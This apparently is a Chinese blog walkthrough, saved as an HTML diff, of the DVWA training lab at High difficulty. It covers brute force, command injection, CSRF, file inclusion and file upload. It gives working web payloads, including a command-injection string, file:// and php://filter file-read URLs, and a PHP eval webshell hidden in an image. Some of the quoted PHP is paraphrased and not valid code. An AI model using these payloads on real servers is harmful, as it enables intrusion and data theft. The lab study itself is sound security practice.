@@ -1,0 +1,1100 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>DVWA 靶场实验报告 (High Level) - blog</title>
+
+  
+    <meta name="description" content="DVWA 靶场实验报告 (High Level) 难度等级：High报告说明：本文为 DVWA 靶场 High 难度下17个漏洞的详细渗透测试步骤，包含漏洞原理、利用方法、工具操作及核心Payload，全程基于Burp Suite、Sqlmap等工具实现，所有操作步骤均配套实操截图https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19664521  📑 目录 Brute Force">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA 靶场实验报告 (High Level)">
+<meta property="og:url" content="https://wr0ld.github.io/posts/f46202bc/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="DVWA 靶场实验报告 (High Level) 难度等级：High报告说明：本文为 DVWA 靶场 High 难度下17个漏洞的详细渗透测试步骤，包含漏洞原理、利用方法、工具操作及核心Payload，全程基于Burp Suite、Sqlmap等工具实现，所有操作步骤均配套实操截图https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19664521  📑 目录 Brute Force">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-03-22T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-23T08:26:49.151Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="靶场练习">
+<meta property="article:tag" content="DVWA">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="CSRF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="靶场练习,DVWA,XSS,SQL注入,CSRF">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-22T12:00:00+08:00","dateModified":"2026-03-23T16:26:49+08:00","datePublished":"2026-03-22T12:00:00+08:00","description":"","headline":"DVWA 靶场实验报告 (High Level)","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/f46202bc/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/f46202bc/","keywords":"靶场练习, DVWA, XSS, SQL注入, CSRF","thumbnailUrl":"/images/DVWA.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper linklist"><div class="widget-header dis-select"><span class="name">文章分类</span></div><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="工具魔改" href="/categories/工具魔改/"><div class="flex"><span>工具魔改</span></div></a>
+<a class="link" title="笔记" href="/categories/笔记/"><div class="flex"><span>笔记</span></div></a>
+<a class="link" title="靶场" href="/categories/靶场/"><div class="flex"><span>靶场</span></div></a>
+<a class="link" title="靶机渗透" href="/categories/靶机渗透/"><div class="flex"><span>靶机渗透</span></div></a>
+<a class="link" title="vulnhub-DC" href="/categories/vulnhub-DC/"><div class="flex"><span>vulnhub-DC</span></div></a>
+<a class="link" title="DVWA" href="/categories/DVWA/"><div class="flex"><span>DVWA</span></div></a></div></div></widget>
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/posts/58685328/"><span class="title">CTF 伪协议</span></a><a class="item title" href="/posts/31fdd992/"><span class="title">Pikachu 靶场通关笔记</span></a><a class="item title" href="/posts/a6c6e02f/"><span class="title">常见Linux权限提升笔记</span></a><a class="item title" href="/posts/f10adb67/"><span class="title">VulnHub DC-9 靶机渗透测试笔记</span></a><a class="item title" href="/posts/16177df0/"><span class="title">VulnHub DC-8 靶机渗透测试笔记</span></a><a class="item title" href="/posts/9bfd2b6a/"><span class="title">VulnHub DC-7 靶机渗透测试笔记</span></a><a class="item title" href="/posts/7ce08dfd/"><span class="title">VulnHub DC-6 靶机渗透测试笔记</span></a><a class="item title" href="/posts/8eb76005/"><span class="title">VulnHub DC-5 靶机渗透测试笔记</span></a><a class="item title" href="/posts/69aac692/"><span class="title">VulnHub DC-4 靶机渗透测试笔记</span></a><a class="item title" href="/posts/b169bdb4/"><span class="title">VulnHub DC-3 靶机渗透测试笔记</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/wr0ld" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/DVWA/">DVWA</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-22T04:00:00.000Z">2026-03-22</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-23T08:26:49.151Z">2026-03-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>DVWA 靶场实验报告 (High Level)</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="DVWA-靶场实验报告-High-Level"><a href="#DVWA-靶场实验报告-High-Level" class="headerlink" title="DVWA 靶场实验报告 (High Level)"></a>DVWA 靶场实验报告 (High Level)</h1><blockquote>
+<p><strong>难度等级</strong>：High<br><strong>报告说明</strong>：本文为 DVWA 靶场 High 难度下<strong>17个漏洞</strong>的详细渗透测试步骤，包含漏洞原理、利用方法、工具操作及核心Payload，全程基于Burp Suite、Sqlmap等工具实现，所有操作步骤均配套实操截图<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold/p/19664521">https://www.cnblogs.com/wrold/p/19664521</a></p>
+</blockquote>
+<h2 id="📑-目录"><a href="#📑-目录" class="headerlink" title="📑 目录"></a>📑 目录</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%231-brute-force">Brute Force — 暴力破解</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%232-command-injection">Command Injection — 命令注入</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%233-csrf">CSRF — 跨站请求伪造</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%234-file-inclusion">File Inclusion — 文件包含</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%235-file-upload">File Upload — 文件上传</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%236-captcha">Insecure CAPTCHA — 不安全的验证码</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%237-sqli">SQL Injection — SQL 注入</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%238-sqli-blind">SQL Injection (Blind) — SQL 盲注</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%239-session">Weak Session IDs — 弱会话 ID</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2310-xss-dom">XSS (DOM) — DOM 型跨站脚本</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2311-xss-reflected">XSS (Reflected) — 反射型跨站脚本</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2312-xss-stored">XSS (Stored) — 存储型跨站脚本</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2313-csp">CSP Bypass — CSP 策略绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2314-js">JavaScript Attacks — JavaScript 攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2315-auth">Authorisation Bypass — 越权访问</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2316-redirect">Open HTTP Redirect — 开放重定向</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/search?q=%2317-crypto">Cryptography — 密码学</a></li>
+</ol>
+<hr>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="1-Brute-Force-—-暴力破解"><a href="#1-Brute-Force-—-暴力破解" class="headerlink" title="1. Brute Force — 暴力破解"></a>1. Brute Force — 暴力破解</h2><h3 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度新增<strong>时间延迟</strong>+<strong>user_token 验证</strong>，token 明文显示在前端页面，需动态提取 token 配合爆破。</p>
+<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol>
+<li><strong>抓包</strong>：通过Burp Suite抓取登录请求包，可见<code>username</code>、<code>password</code>、<code>user_token</code>三个核心参数，token 为32位随机字符串。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303140843120.png"></li>
+<li><strong>定位token</strong>：查看前端页面源码，token 藏在<code>&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;xxx&quot;&gt;</code>中，可通过正则匹配提取。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171351342.png"></li>
+<li><strong>Burp 配置</strong><ul>
+<li>进入<code>Intruder</code>，选择<strong>Pitchfork 交叉爆破</strong>，标记<code>password</code>和<code>user_token</code>为爆破位置；<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171521377.png"></li>
+<li>进入<code>Settings</code>，开启<strong>提取Grep项</strong>，正则表达式配置为<code>value=(.*?)\/&gt;\r\n</code>，匹配前端的token值；<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171551676.png"></li>
+<li>对<code>user_token</code>的Payload类型选择<strong>递归提取</strong>，并填入<strong>初始请求的有效token</strong>（抓包获取的原始token）。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171619770.png"><br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171822505.png"></li>
+</ul>
+</li>
+<li><strong>爆破设置</strong>：将资源池发包最大次数改为<strong>1</strong>（禁止并发，避免token失效），加载密码字典开始爆破。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171646350.png"></li>
+<li><strong>结果分析</strong>：按<strong>响应长度排序</strong>，长度与其他条目不同的即为正确密码（正确登录的响应页面与错误页面长度存在明显差异）。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171700267.png"></li>
+</ol>
+<h3 id="核心注意点"><a href="#核心注意点" class="headerlink" title="核心注意点"></a>核心注意点</h3><p>抓包后<strong>禁止提前发包</strong>，否则token会刷新导致爆破失败，需保证初始token与爆破请求一致。</p>
+<hr>
+<h2 id="2-Command-Injection-—-命令注入"><a href="#2-Command-Injection-—-命令注入" class="headerlink" title="2. Command Injection — 命令注入"></a>2. Command Injection — 命令注入</h2><h3 id="漏洞特点-1"><a href="#漏洞特点-1" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对管道符等命令分隔符做了黑名单过滤，但<strong>过滤代码存在空格书写错误</strong>，导致过滤失效，可构造无空格的命令拼接Payload。</p>
+<h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$target</span>= <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>]);</span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="comment">// 过滤代码存在多余空格，导致过滤逻辑失效</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$target</span>=<span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ),<span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>),<span class="string">&quot;Windows NT&quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$cmd</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping &quot;</span>.<span class="variable">$target</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$cmd</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c4 &quot;</span>.<span class="variable">$target</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171906846.png"><br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171947996.png"></p>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>直接构造<strong>无空格管道符拼接</strong>的Payload，绕过滤黑名单位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+<p>提交后成功执行系统命令，返回当前用户信息。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172002703.png"></p>
+<hr>
+<h2 id="3-CSRF-—-跨站请求伪造"><a href="#3-CSRF-—-跨站请求伪造" class="headerlink" title="3. CSRF — 跨站请求伪造"></a>3. CSRF — 跨站请求伪造</h2><h3 id="漏洞特点-2"><a href="#漏洞特点-2" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度新增<strong>user_token 验证</strong>，token 明文显示在前端HTML源码中，单纯构造CSRF链接无法绕过，需<strong>配合XSS漏洞提取token</strong>后组合攻击。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
+<li>抓包修改密码请求，可见URL中包含<code>password_new</code>、<code>password_conf</code>、<code>user_token</code>参数，token为必填项。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172205628.png"></li>
+<li>查看前端源码，<code>user_token</code>藏在隐藏输入框中，攻击者无法直接获取受害者的token，但可通过XSS注入脚本<strong>自动提取受害者的token</strong>并拼接CSRF请求。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172211542.png"></li>
+</ol>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol>
+<li>利用靶场中存在的XSS漏洞（如反射型、存储型），构造XSS脚本提取页面中的<code>user_token</code>；</li>
+<li>将提取的token拼接至CSRF修改密码的URL中；</li>
+<li>诱导受害者点击包含XSS+CSRF的恶意链接，实现自动修改密码。</li>
+</ol>
+<hr>
+<h2 id="4-File-Inclusion-—-文件包含"><a href="#4-File-Inclusion-—-文件包含" class="headerlink" title="4. File Inclusion — 文件包含"></a>4. File Inclusion — 文件包含</h2><h3 id="漏洞特点-3"><a href="#漏洞特点-3" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对<code>page</code>参数做了<strong>关键词白名单过滤</strong>（仅允许包含<code>file</code>&#x2F;<code>fie</code>），但未限制伪协议，可通过<strong>file:&#x2F;&#x2F;伪协议</strong>实现任意文件读取。</p>
+<h3 id="漏洞代码分析-1"><a href="#漏洞代码分析-1" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172251076.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">fnmatch</span>(<span class="string">&quot;file,fie&quot;</span>,<span class="variable">$file</span>)&amp;&amp;<span class="variable">$file</span> !=<span class="string">&quot;include.php&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p>构造<code>file://</code>伪协议Payload，指定本地文件绝对路径，实现任意目录文件读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa:8564/vulnerabilities/fi/?page=file://D:/1.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172309457.png"></p>
+<h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>若服务器开启<code>php://</code>伪协议相关配置，可结合<code>php://filter</code>实现源码读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa:8564/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="5-File-Upload-—-文件上传"><a href="#5-File-Upload-—-文件上传" class="headerlink" title="5. File Upload — 文件上传"></a>5. File Upload — 文件上传</h2><h3 id="漏洞特点-4"><a href="#漏洞特点-4" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度做了<strong>多重过滤</strong>：文件类型校验、文件大小限制、<code>getimagesize()</code>图片头校验，无法直接上传webshell，需<strong>制作图片马</strong>配合<strong>文件包含漏洞</strong>实现webshell执行。</p>
+<h3 id="漏洞代码分析-2"><a href="#漏洞代码分析-2" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172608710.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 校验文件后缀、大小、是否为图片</span></span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>) in <span class="variable">$allowed_ext</span>)&amp;&amp;(<span class="variable">$uploaded_size</span>&lt;<span class="number">100000</span>)&amp;&amp;<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$uploaded_tmp</span>))&#123;</span><br><span class="line">    <span class="comment">// 上传成功逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol>
+<li><strong>制作图片马</strong>：任意正常图片（如11.png）后拼接PHP一句话webshell，<strong>保留图片文件头</strong>（避免<code>getimagesize()</code>校验失败）。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 图片马制作（cmd命令）</span><br><span class="line">copy 1.png /b + shell.php /a 11.png</span><br></pre></td></tr></table></figure>
+图片马内容示例：<code>&lt;?php phpinfo();?&gt;</code>（测试用）&#x2F;<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>（一句话webshell）。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172643878.png"></li>
+<li><strong>上传图片马</strong>：直接上传制作好的11.png，靶场提示上传成功，返回文件路径<code>../hackable/uploads/11.png</code>。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172654847.png"></li>
+<li><strong>文件包含利用</strong>：通过File Inclusion漏洞的<code>file://</code>伪协议，包含上传的图片马，执行PHP代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa:8564/vulnerabilities/fi/?page=file:///D:/phpstudy_pro/WWW/DVWA-master/hackable/uploads/11.png</span><br></pre></td></tr></table></figure>
+访问后成功执行<code>phpinfo()</code>，证明图片马生效。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172702955.png"></li>
+</ol>
+<h3 id="核心注意点-1"><a href="#核心注意点-1" class="headerlink" title="核心注意点"></a>核心注意点</h3><p>图片马必须<strong>保留合法图片头</strong>，否则<code>getimagesize()</code>会检测出非图片文件，导致上传失败。</p>
+<hr>
+<h2 id="6-Insecure-CAPTCHA-—-不安全的验证码"><a href="#6-Insecure-CAPTCHA-—-不安全的验证码" class="headerlink" title="6. Insecure CAPTCHA — 不安全的验证码"></a>6. Insecure CAPTCHA — 不安全的验证码</h2><hr>
+<h2 id="7-SQL-Injection-—-SQL-注入"><a href="#7-SQL-Injection-—-SQL-注入" class="headerlink" title="7. SQL Injection — SQL 注入"></a>7. SQL Injection — SQL 注入</h2><h3 id="漏洞特点-5"><a href="#漏洞特点-5" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度新增<strong>会话弹窗验证</strong>，但注入核心逻辑未变，仍为<strong>字符型注入</strong>，可通过手工注入或Sqlmap实现数据提取。</p>
+<h3 id="利用步骤（手工注入）"><a href="#利用步骤（手工注入）" class="headerlink" title="利用步骤（手工注入）"></a>利用步骤（手工注入）</h3><ol>
+<li><strong>判断注入类型</strong>：<ul>
+<li>输入<code>1</code>：正常返回数据；<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172912308.png">   </li>
+<li>输入<code>1&#39;</code>：页面报错，说明为<strong>字符型注入</strong>，需用单引号闭合，注释符<code>#</code>截断语句。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172933124.png"><br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172942705.png"></li>
+</ul>
+</li>
